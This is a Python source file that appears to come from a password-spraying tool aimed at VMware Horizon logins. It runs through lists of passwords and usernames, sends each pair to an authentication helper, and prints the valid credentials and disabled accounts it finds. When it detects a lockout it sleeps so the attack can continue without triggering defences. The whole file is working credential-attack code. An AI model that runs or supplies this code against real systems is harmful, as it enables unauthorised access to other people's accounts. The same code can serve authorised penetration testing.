import logging
import sys
from typing import Optional

from brutemethehorizon import helper
from brutemethehorizon.config import Colors, Config

logger = logging.getLogger('horizon')


def run(url: str, userlist: list, passlist: list, domain: str) -> Optional[dict]:
    d = {}
    for password in passlist:
        for username in userlist:
            pair = spray(url, username, password, domain)
            if pair is None:
                return None
            if pair != {}:
                for k, v in pair.items():
                    if v != '':
                        d.update(pair)
                    userlist.remove(username)
    return d


def spray(url: str, username: str, password: str, domain: str) -> Optional[dict]:
    try:
        error_msg = helper.auth(url, username, password, domain)
        if error_msg is None:
            print(
                f"[{Colors.green}VALID{Colors.reset}] {username}:{password}", end='\n\n')
            return {username: password}
        elif error_msg == helper.cannot_use_msg:
            print(
                f"[{Colors.green}VALID{Colors.reset}] {username}:{password} {Colors.yellow}Can't use Horizon{Colors.reset}",
                end='\n\n')
            return {username: password}
        elif error_msg == helper.non_auth_msg:
            sys.stdout.write('\x1b[1A')
            sys.stdout.write('\x1b[2K')
            print(f"[{Colors.red}BAD_PASSWORD{Colors.reset}] {username}:{password}")
            return {}
        elif error_msg == helper.disabled_msg:
            print(f'[{Colors.red}DISABLED{Colors.reset}] {username}', end="\n\n")
            return {username: "DISABLED"}
        elif error_msg == helper.locked_msg:
            logger.error("Locked account detected. Sleep 5 min.")
            helper.timer(Config.sleep_time, "[*] Time to continue:")
            return {}
        else:
            logger.error(f'Unknown error: {error_msg} on {username}')
            return {}
    except Exception as e:
        logger.error(f"{e}\n Sleep {Config.sleep_time} sec.")
        helper.timer(Config.sleep_time, "[*] Time to continue:")
        return {}
